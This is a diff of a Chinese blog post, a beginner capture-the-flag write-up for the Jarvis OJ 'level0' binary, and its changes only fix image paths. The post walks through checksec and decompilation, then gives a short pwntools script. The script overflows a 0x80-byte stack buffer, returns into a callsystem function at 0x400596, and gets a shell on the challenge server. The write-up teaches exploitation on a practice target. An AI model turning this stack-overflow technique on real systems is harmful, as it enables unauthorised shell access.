+<li>下载好先运行看看<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-00-56-10.png"></li>
+<li>简单来说就是打印一个<code>Hello World</code>然后就等待输入，接着程序就结束了，首先检查一下这个程序，看看开启了什么保护<br><code>checksec level0</code><br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-00-59-59.png"></li>
+<li>只有栈代码不可执行这个保护是开启的状态，下一步，反编译<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-01-02-24.png"><br>顺便记住，这是个x64程序</li>
 <li>没什么好说的，只使用了<code>read()</code>这个函数，我们能做的就是栈溢出来覆盖返回地址，现在去找找有没有<code>system</code>或者其他能<code>Get Shell</code>的函数地址</li>
-<li>刚好发现程序中调用了<code>system</code>函数，而且调用它的函数<code>Callsystem</code>刚好就是我们要执行的命令。<br><img src="/.com//2020-06-08-01-10-21.png"><br>顺便啊，还直接看到了函数的地址<br><img src="/.com//2020-06-08-01-12-03.png"></li>
+<li>刚好发现程序中调用了<code>system</code>函数，而且调用它的函数<code>Callsystem</code>刚好就是我们要执行的命令。<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-01-10-21.png"><br>顺便啊，还直接看到了函数的地址<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-01-12-03.png"></li>
 <li>可以尝试构造一下payload，按照我们发现的东西来，首先是变量大小为0x80，然后是覆盖EBP，最后覆盖返回地址，记得使用x64的地址<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">callsystem_addr=<span class="number">0x400596</span></span><br><span class="line">pad=<span class="number">0x80</span></span><br><span class="line">payload=<span class="string">&quot;A&quot;</span>*pad+<span class="string">&quot;BBBBBBBB&quot;</span>+p64(callsystem_addr)</span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
-可以得到payload(请忽略我这里打错单词)<br><img src="/.com//2020-06-08-01-32-14.png"></li>
-<li>还可以在本机尝试一下<br><img src="/.com//2020-06-08-01-32-59.png"><br>？？？<br>就很神秘~</li>
+可以得到payload(请忽略我这里打错单词)<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-01-32-14.png"></li>
+<li>还可以在本机尝试一下<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-01-32-59.png"><br>？？？<br>就很神秘~</li>
 <li>接下来利用pwntools构建连接并且发送数据就好了<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;pwn2.jarvisoj.com&quot;</span>,<span class="number">9881</span>)  <span class="comment">#remote：主要用作远程和服务器交互，返回一个类似连接对象</span></span><br><span class="line">junk = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span></span><br><span class="line">fakebp = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">syscall = <span class="number">0x0400596</span>   <span class="comment">#Callsystem的函数地址</span></span><br><span class="line">payload = junk + fakebp + p64(syscall) <span class="comment">#p64：将数字转为字符串（p64/u64   p32/u32）</span></span><br><span class="line">sh.send(payload) <span class="comment">#send：发送数据，通过连接对象调用</span></span><br><span class="line">sh.interactive() <span class="comment">#interactive：反弹shell</span></span><br></pre></td></tr></table></figure></li>
-<li>结果直接得到shell~<br><img src="/.com//2020-06-08-01-48-38.png"></li>
+<li>结果直接得到shell~<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-01-48-38.png"></li>
 </ul>
 
     </div>
